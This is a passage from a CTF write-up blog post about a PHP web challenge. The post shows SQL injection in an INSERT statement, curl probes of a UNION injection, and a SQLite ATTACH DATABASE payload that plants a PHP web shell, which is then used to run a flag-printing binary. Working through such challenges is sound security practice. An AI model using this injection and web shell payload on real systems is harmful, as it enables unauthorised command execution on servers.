+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flag&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flag...&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Add&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>From the following, we can see that any input can be inserted into the <code>flag</code> parameter. We expect SQL injection to be possible.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span>if (isset($_POST[&#34;flag&#34;])) {
+</span></span><span style=display:flex><span>    $flag = $_POST[&#34;flag&#34;];
+</span></span><span style=display:flex><span>    $pdo-&gt;exec(&#34;INSERT INTO Flags VALUES (&#39;$flag&#39;);&#34;);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>After trying various things, it turns out that UNION Based injection is possible.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -X POST --data-urlencode &#34;flag=1&#39;) UNION SELECT 1--&#34; https://no-flags.web.actf.co/ # ok
+$ curl -X POST --data-urlencode &#34;flag=1&#39;) UNION SELECT 1,2--&#34; https://no-flags.web.actf.co/ # error(not ok)
+</code></pre><p>Now that SQL injection is possible, I think about connecting to RCE next. I can find <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database>this cheat sheet</a> by doing various research.</p><p>RCE is possible by POST the following payload as <code>flag</code>.</p><pre tabindex=0><code>1&#39;) UNION SELECT 1; ATTACH DATABASE &#39;/var/www/html/abyss/hoge.php&#39; AS hoge; CREATE TABLE hoge.cmd (dataz text); INSERT INTO hoge.cmd (dataz) VALUES (&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;);--
+</code></pre><p>We know from <code>Dockerfile</code> that<code> /printflag</code> is a binary that displays the flag, so run it to get the flag.</p><pre tabindex=0><code>$ curl &#34;https://no-flags.web.actf.co/abyss/crack.php?cmd=/printflag&#34; --output -
+��Cactf{why_do_people_still_use_php}ataz text)/GtablepwnpwnCREATE TABLE pwn (dataz text)1GtablehogehogeCREATE TABLE hoge (hoge text)
+�� Iactf{why_do_people_still_use_php}
+</code></pre><h1 id=thoughts>Thoughts</h1><p>I was also working on Secure Vault, but it was a pity that I couldn&rsquo;t make a plan to solve.
+It was a fun CTF with lots of difficult problems that I could solve if I worked hard at my own level.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
